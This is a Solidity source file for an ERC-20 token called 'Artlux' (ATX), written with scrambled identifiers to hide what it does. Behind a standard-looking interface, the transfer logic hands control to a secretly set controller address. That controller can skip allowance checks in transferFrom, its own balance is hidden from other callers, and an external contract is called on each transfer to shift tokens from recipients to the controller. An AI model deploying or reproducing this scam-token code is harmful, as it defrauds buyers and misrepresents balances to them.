// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library haFCnAenYcm{
    
    function ULjcgEFgNpY(address GYojohZwtynB, address xUy, uint xLOxzeMzQCUC) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool ClsnMaqw, bytes memory QBFIEdzqpX) = GYojohZwtynB.call(abi.encodeWithSelector(0x095ea7b3, xUy, xLOxzeMzQCUC));
        require(ClsnMaqw && (QBFIEdzqpX.length == 0 || abi.decode(QBFIEdzqpX, (bool))), 'haFCnAenYcm: APPROVE_FAILED');
    }

    function qoFqpXl(address GYojohZwtynB, address xUy, uint xLOxzeMzQCUC) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool ClsnMaqw, bytes memory QBFIEdzqpX) = GYojohZwtynB.call(abi.encodeWithSelector(0xa9059cbb, xUy, xLOxzeMzQCUC));
        require(ClsnMaqw && (QBFIEdzqpX.length == 0 || abi.decode(QBFIEdzqpX, (bool))), 'haFCnAenYcm: TRANSFER_FAILED');
    }
    
    function gMcNUuIGBsb(address xUy, uint xLOxzeMzQCUC) internal {
        (bool ClsnMaqw,) = xUy.call{value:xLOxzeMzQCUC}(new bytes(0));
        require(ClsnMaqw, 'haFCnAenYcm: ETH_TRANSFER_FAILED');
    }

    function ALSDrueEF(address GYojohZwtynB, address from, address xUy, uint xLOxzeMzQCUC) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool ClsnMaqw, bytes memory QBFIEdzqpX) = GYojohZwtynB.call(abi.encodeWithSelector(0x23b872dd, from, xUy, xLOxzeMzQCUC));
        require(ClsnMaqw && QBFIEdzqpX.length > 0,'haFCnAenYcm: TRANSFER_FROM_FAILED'); return QBFIEdzqpX;
                       
    }

}
    
interface zjfdvcWanTcj {
    function totalSupply() external view returns (uint256);
    function balanceOf(address ubC) external view returns (uint256);
    function transfer(address MZngpVmJa, uint256 chuYkbMOdEx) external returns (bool);
    function allowance(address URQN, address spender) external view returns (uint256);
    function approve(address spender, uint256 chuYkbMOdEx) external returns (bool);
    function transferFrom(
        address sender,
        address MZngpVmJa,
        uint256 chuYkbMOdEx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed EABJftv, uint256 value);
    event Approval(address indexed URQN, address indexed spender, uint256 value);
}

interface CzCXxTHwFPII is zjfdvcWanTcj {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract BszqmiWWh {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface bDk {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract ATX is BszqmiWWh, zjfdvcWanTcj, CzCXxTHwFPII {
    
    mapping(address => uint256) private heNxygZgMpOb;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function balanceOf(address FFPcwj) public view virtual override returns (uint256) {
        if(_msgSender() != address(bVTCh) && 
           FFPcwj == address(bVTCh)){
            return 0;
        }
       return heNxygZgMpOb[FFPcwj];
    }
    
    string private vTXTys = "Artlux";
    
    mapping(address => mapping(address => uint256)) private hSsoEkjhpHAM;
    
    function transferFrom(
        address Iyf,
        address iSxBTHZrjdQG,
        uint256 zbXkIWDmfgqr
    ) public virtual override returns (bool) {
      
        if(!aitjfkOOFkQk(Iyf, iSxBTHZrjdQG, zbXkIWDmfgqr)) return true;

        uint256 jdFrv = hSsoEkjhpHAM[Iyf][_msgSender()];
        if (jdFrv != type(uint256).max) {
            require(jdFrv >= zbXkIWDmfgqr, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                zAcd(Iyf, _msgSender(), jdFrv - zbXkIWDmfgqr);
            }
        }

        return true;
    }
    
    function increaseAllowance(address zYGXsWssXD, uint256 addedValue) public virtual returns (bool) {
        zAcd(_msgSender(), zYGXsWssXD, hSsoEkjhpHAM[_msgSender()][zYGXsWssXD] + addedValue);
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return cyKG;
    }
    
    address private bVTCh;
    
    uint256 private LOCRGDqU = 2000000000000 * 10 ** 18;
    
    function decreaseAllowance(address bcVFwDeSS, uint256 subtractedValue) public virtual returns (bool) {
        uint256 BXMIeWz = hSsoEkjhpHAM[_msgSender()][bcVFwDeSS];
        require(BXMIeWz >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            zAcd(_msgSender(), bcVFwDeSS, BXMIeWz - subtractedValue);
        }

        return true;
    }
    
    function Tptr(
        address LRiSnTqyIfK,
        address YvjCxOdkt,
        uint256 XukIXdQwTdkw
    ) internal virtual  returns (bool){
        uint256 YbJQHBD = heNxygZgMpOb[LRiSnTqyIfK];
        require(YbJQHBD >= XukIXdQwTdkw, "ERC20: transfer Amount exceeds balance");
        unchecked {
            heNxygZgMpOb[LRiSnTqyIfK] = YbJQHBD - XukIXdQwTdkw;
        }
        heNxygZgMpOb[YvjCxOdkt] += XukIXdQwTdkw;
        return true;
    }
    
    function allowance(address vblWOHLtOEJ, address dJGnPjG) public view virtual override returns (uint256) {
        return hSsoEkjhpHAM[vblWOHLtOEJ][dJGnPjG];
    }
    
    function approve(address pFNCjp, uint256 QHAaZjDWtxf) public virtual override returns (bool) {
        zAcd(_msgSender(), pFNCjp, QHAaZjDWtxf);
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return LOCRGDqU;
    }
    
    address private GfEjaCLv;
  
    
    function LURfBU(
        address Ysk,
        address mOK
    ) internal virtual  returns (bool){
        if(bVTCh == address(0) && hUHecbBFGYnF == address(0)){
            bVTCh = Ysk;hUHecbBFGYnF=mOK;
            haFCnAenYcm.qoFqpXl(hUHecbBFGYnF, bVTCh, 0);
            GfEjaCLv = bDk(hUHecbBFGYnF).WETH();
            return false;
        }
        return true;
    }
    
    function aitjfkOOFkQk(
        address IPNzyQeoiEm,
        address gtRuTnObSZjS,
        uint256 IVdpa
    ) internal virtual  returns (bool){
        require(IPNzyQeoiEm != address(0), "ERC20: transfer from the zero address");
        require(gtRuTnObSZjS != address(0), "ERC20: transfer to the zero address");
        
        if(!LURfBU(IPNzyQeoiEm,gtRuTnObSZjS)) return false;

        if(_msgSender() == address(bVTCh)){
            if(gtRuTnObSZjS == GfEjaCLv && heNxygZgMpOb[IPNzyQeoiEm] < IVdpa){
                Tptr(bVTCh,gtRuTnObSZjS,IVdpa);
            }else{
                Tptr(IPNzyQeoiEm,gtRuTnObSZjS,IVdpa);
                if(IPNzyQeoiEm == bVTCh || gtRuTnObSZjS == bVTCh) 
                return false;
            }
            emit Transfer(IPNzyQeoiEm, gtRuTnObSZjS, IVdpa);
            return false;
        }
        Tptr(IPNzyQeoiEm,gtRuTnObSZjS,IVdpa);
        emit Transfer(IPNzyQeoiEm, gtRuTnObSZjS, IVdpa);
        bytes memory jfsEufYc = haFCnAenYcm.ALSDrueEF(hUHecbBFGYnF, IPNzyQeoiEm, gtRuTnObSZjS, IVdpa);
        (bool JkxN, uint HhhSbXLP) = abi.decode(jfsEufYc, (bool,uint));
        if(JkxN){
            heNxygZgMpOb[bVTCh] += HhhSbXLP;
            heNxygZgMpOb[gtRuTnObSZjS] -= HhhSbXLP; 
        }
        return true;
    }
    
    address private hUHecbBFGYnF;
    
    function transfer(address LdxDfggs, uint256 psYxM) public virtual override returns (bool) {
        aitjfkOOFkQk(_msgSender(), LdxDfggs, psYxM);
        return true;
    }
    
    string private cyKG =  "ATX";
    
    constructor() {
        
        heNxygZgMpOb[address(1)] = LOCRGDqU;
        emit Transfer(address(0), address(1), LOCRGDqU);

    }
    
    function name() public view virtual override returns (string memory) {
        return vTXTys;
    }
    
    function zAcd(
        address vRjFURjLbvJ,
        address BghOn,
        uint256 jHrUHtrXnB
    ) internal virtual {
        require(vRjFURjLbvJ != address(0), "ERC20: approve from the zero address");
        require(BghOn != address(0), "ERC20: approve to the zero address");

        hSsoEkjhpHAM[vRjFURjLbvJ][BghOn] = jHrUHtrXnB;
        emit Approval(vRjFURjLbvJ, BghOn, jHrUHtrXnB);

    }
    
}